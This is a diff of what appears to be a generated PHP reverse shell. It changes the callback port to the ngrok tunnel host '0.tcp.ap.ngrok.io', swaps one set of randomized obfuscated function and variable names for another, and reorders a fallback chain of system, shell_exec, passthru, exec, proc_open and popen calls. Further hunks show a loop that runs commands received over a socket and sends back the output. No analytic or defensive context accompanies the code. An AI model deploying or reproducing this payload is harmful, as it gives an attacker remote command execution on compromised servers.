@@ -10,28 +10,39 @@
       }
       
     $ipaddr='0.tcp.ap.ngrok.io';
-    $port=13041;
+    $port=18860;
 
-    if(!function_exists('AQMYeW')){
-      function AQMYeW($c){
+    if(!function_exists('CRiorGIXh')){
+      function CRiorGIXh($c){
         global $dis;
         
       if (FALSE !== stristr(PHP_OS, 'win' )) {
         $c=$c." 2>&1\n";
       }
-      $njvGN='is_callable';
-      $cvkUSKU='in_array';
+      $aAQcpv='is_callable';
+      $IZwd='in_array';
       
-      if($njvGN('system')&&!$cvkUSKU('system',$dis)){
+      if($aAQcpv('system')&&!$IZwd('system',$dis)){
         ob_start();
         system($c);
         $o=ob_get_contents();
         ob_end_clean();
       }else
-      if($njvGN('shell_exec')&&!$cvkUSKU('shell_exec',$dis)){
+      if($aAQcpv('shell_exec')&&!$IZwd('shell_exec',$dis)){
         $o=`$c`;
       }else
-      if($njvGN('proc_open')&&!$cvkUSKU('proc_open',$dis)){
+      if($aAQcpv('passthru')&&!$IZwd('passthru',$dis)){
+        ob_start();
+        passthru($c);
+        $o=ob_get_contents();
+        ob_end_clean();
+      }else
+      if($aAQcpv('exec')&&!$IZwd('exec',$dis)){
+        $o=array();
+        exec($c,$o);
+        $o=join(chr(10),$o).chr(10);
+      }else
+      if($aAQcpv('proc_open')&&!$IZwd('proc_open',$dis)){
         $handle=proc_open($c,array(array('pipe','r'),array('pipe','w'),array('pipe','w')),$pipes);
         $o=NULL;
         while(!feof($pipes[1])){
@@ -39,12 +50,7 @@
         }
         @proc_close($handle);
       }else
-      if($njvGN('exec')&&!$cvkUSKU('exec',$dis)){
-        $o=array();
-        exec($c,$o);
-        $o=join(chr(10),$o).chr(10);
-      }else
-      if($njvGN('popen')&&!$cvkUSKU('popen',$dis)){
+      if($aAQcpv('popen')&&!$IZwd('popen',$dis)){
         $fp=popen($c,'r');
         $o=NULL;
         if(is_resource($fp)){
@@ -53,12 +59,6 @@
           }
         }
         @pclose($fp);
-      }else
-      if($njvGN('passthru')&&!$cvkUSKU('passthru',$dis)){
-        ob_start();
-        passthru($c);
-        $o=ob_get_contents();
-        ob_end_clean();
       }else
       {
         $o=0;
@@ -77,7 +77,7 @@
         } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
           break;
         }else{
-          $out=AQMYeW(substr($c,0,-1));
+          $out=CRiorGIXh(substr($c,0,-1));
           if($out===false){
             fwrite($s,$nofuncs);
             break;
@@ -97,7 +97,7 @@
         } else if (substr($c,0,4) == 'quit' || substr($c,0,4) == 'exit') {
           break;
         }else{
-          $out=AQMYeW(substr($c,0,-1));
+          $out=CRiorGIXh(substr($c,0,-1));
           if($out===false){
             @socket_write($s,$nofuncs);
             break;
